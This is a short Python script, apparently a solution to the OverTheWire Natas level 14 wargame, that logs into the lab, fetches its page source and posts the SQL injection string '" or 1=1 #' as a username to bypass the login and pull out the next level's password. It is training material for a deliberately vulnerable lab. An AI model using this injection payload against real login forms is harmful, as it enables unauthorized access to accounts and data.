import requests
import re

username = "natas14"
password = "<censored>"
url = "http://%s.natas.labs.overthewire.org/"  % username

session = requests.Session()

response = session.get(url,auth=(username,password))
print(response.text)
print("="*50)

source = "index-source.html"
response = session.get(url+source,auth=(username,password))
print(response.text)
print("="*50)

sql_injection = '" or 1=1 #'
response = session.post(url,auth=(username,password),data={"username":sql_injection,"password":""})
password = re.findall("The password for natas15 is (.*)<br>",response.text)[0]
print("\nThe password for the next level is: " + password)